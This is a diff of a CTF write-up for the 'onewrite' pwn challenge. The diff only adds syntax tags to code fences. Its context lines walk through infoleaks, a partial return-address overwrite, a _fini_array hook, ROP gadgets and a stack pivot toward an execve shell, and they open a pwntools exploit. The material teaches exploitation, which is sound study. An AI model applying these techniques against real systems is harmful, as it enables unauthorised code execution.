@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file onewrite
 onewrite: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, for GNU/Linux 3.2.0, with debug_info, not stripped
 $    pwn checksec onewrite
@@ -30,7 +30,7 @@ So we can see that we are dealing with a `64` bit binary with a Stack Canary, NX
 
 When we take a look at the main function in Ghidra, we see this:
 
-```
+```c
 void main(void)
 
 {
@@ -44,7 +44,7 @@ void main(void)
 
 So we can see it prints some text, and calls `do_leak`:
 
-```
+```c
 void do_leak(void)
 
 {
@@ -76,7 +76,7 @@ void do_leak(void)
 
 So we can see it prompts us for a choice. If we choose `1`, it will print the address of `auStack24` and give us a stack infoleak. If we choose `2`, it will print the address of the `do_leak` function and give us a PIE infoleak. So we essentially get a choice between either a PIE or a stack infoleak. Then it calls `do_overwrite`:
 
-```
+```c
 void do_overwrite(void)
 
 {
@@ -103,7 +103,7 @@ So for the first run through, we will choose the stack infoleak. Using this we w
 
 We set a breakpoint for the `ret` instruction in `do_leak`:
 
-```
+```gdb
 Breakpoint 1, 0x00007f6814bc3ab7 in ?? ()
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
@@ -166,7 +166,7 @@ Stack level 0, frame at 0x7ffe8c136818:
 
 So we can see that the saved return address is stored at `0x7ffe8c136818` and points to `0x7f6814bc3b09`. That address corresponds to `0x00108b09` in `do_leak`. The address we leaked was `0x7ffe8c136800`. Then the offset to the saved return address for `do_leak` from the address we have leaked is `0x7ffe8c136818 - 0x7ffe8c136800 = 0x18`
 
-```
+```c
         00108aff e8 5c 84        CALL       puts                                             int puts(char * __s)
                  00 00
         00108b04 e8 0c ff        CALL       do_leak                                          undefined do_leak()
@@ -177,7 +177,7 @@ So we can see that the saved return address is stored at `0x7ffe8c136818` and po
 
 What we can do here is a partial overwrite. That is where we only overwrite only a part of the saved return instruction. Because PIE works by addressing all instructions to an address and adding that to whatever the base instruction is, we can overwrite the last byte of the instruction address which will let us jump within a certain range around the original address, without having to use an infoleak or brute force the address. This can work since most of the time the base address for PIE ends in a null byte (which we can see here):
 
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x00007f6814bbb000 0x00007f6814c69000 0x0000000000000000 r-x /Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite
@@ -197,7 +197,7 @@ So we will overwrite the least significant byte of the return address to be `0x0
 
 So we are able to call `do_leak` again, however it takes our QWORD write each time we do it, so past the initial infoleaks it doesn't serve much of a purpose past that. We will write a hook to the `_fini_array` table, that contains a list of functions which will be called when the program ends. That way we can have the program call `do_overwrite` when it exits. Also since after a function is ran, it moves on to the next entry, we will need to write at least two entries for the `do_overwrite` address to the `_fini_array`. We can see that it is `0x10` bytes large, which will work for this:
 
-```
+```gdb
 gef➤  info files
 Symbols from "/Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite".
 Native process:
@@ -273,7 +273,7 @@ Also one more thing. Each time we call `__libc_csu_fini`, due to how the memory 
 For the ROP gadget, turns out the binary has all of the gadgets needed to pop a shell. So we won't be needing to use gadgets from libc.
 
 A lot of the output from these commands were omitted for the sake of making it look readable:
-```
+```console
 $ python ROPgadget.py --binary onewrite | grep "pop rdi"
 0x00000000000084fa : pop rdi ; ret
 $ python ROPgadget.py --binary onewrite | grep "pop rsi"
@@ -289,7 +289,7 @@ $ python ROPgadget.py --binary onewrite | grep "add rsp"
 
 The `add rsp` gadget at the end we will cover later. However we can see that we have all of the gadgets we need to make an `execve` syscall from just using gadgets from the `PIE` section of memory. For writing the string `/bin/sh\x00` we can just use the QWORD write loop to write that to memory. Looking through the memory, we find a place that might work to write `/bin/sh` in the bss:
 
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x00007fd53eb27000 0x00007fd53ebd5000 0x0000000000000000 r-x /Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite
@@ -359,7 +359,7 @@ So we can see that the bss starts at `0x00000000002b3300 + 0x00007fd53eb27000 = 
 
 `0x7f8be09a60f0 - 0x7f8be0700a15 = 0x2a56db`
 
-```
+```gdb
 gef➤  x/50g 0x7fd53edda300
 0x7fd53edda300: 0x0 0x0
 0x7fd53edda310: 0x0 0x0
@@ -396,7 +396,7 @@ The last thing we will need to know is where to store our rop chain. This will d
 
 The stack pivot attack here will work when `do_overwrite` returns. We can see that when a function returns (calls `ret` instruction), the `rsp` register (which points to the top of the stack) points to the instruction address which will be executed:
 
-```
+```gdb
 ───────────────────────────────────────────────────────────────────── stack ────
 0x00007ffce47b3838│+0x0000: 0x00007f8889c49ab2  →   nop    ← $rsp
 0x00007ffce47b3840│+0x0008: 0x00007f8889c4a780  →   push r15
@@ -438,7 +438,7 @@ gef➤  x/3i 0x7f8889c49ab2
 So how our stack pivot will work, we will add a value to the `rsp` register, which will shift where it returns. We will just shift it up so it starts executing our rop chain, which we can store further up the stack. To find the exact offset, we can just see where the stack pivot will pivot us to, and just store the rop chain at that offset. We can see how our gadget shifts it:
 
 First we add `0xd0` to the `rsp`:
-```
+```gdb
 Breakpoint 1, 0x00007f3bdb37d6f3 in ?? ()
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
@@ -490,7 +490,7 @@ $1 = (void *) 0x7ffd5f925f68
 ```
 
 We can see that it has been shifted up by `0xd0`:
-```
+```gdb
 Breakpoint 2, 0x00007f3bdb37d6fa in ?? ()
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
@@ -542,7 +542,7 @@ $2 = (void *) 0x7ffd5f926038
 ```
 
 Lastly we can see that we popped `rbx` which will increment the stack pointer (stack grows down):
-```
+```gdb
 Breakpoint 3, 0x00007f3bdb37d6fb in ?? ()
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
@@ -607,7 +607,7 @@ With that, we can see that `rsp` points to `0x7ffd5f926040` on the stack. For th
 
 Putting it all together, we have the following exploit:
 
-```
+```python
 # This exploit is based off of: https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-01-19-Insomni-Hack-Teaser/README.md#onewrite
 
 from pwn import *
@@ -723,7 +723,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $ python exploit.py
 [+] Starting local process './onewrite': pid 14815
 [!] Did not find any GOT entries
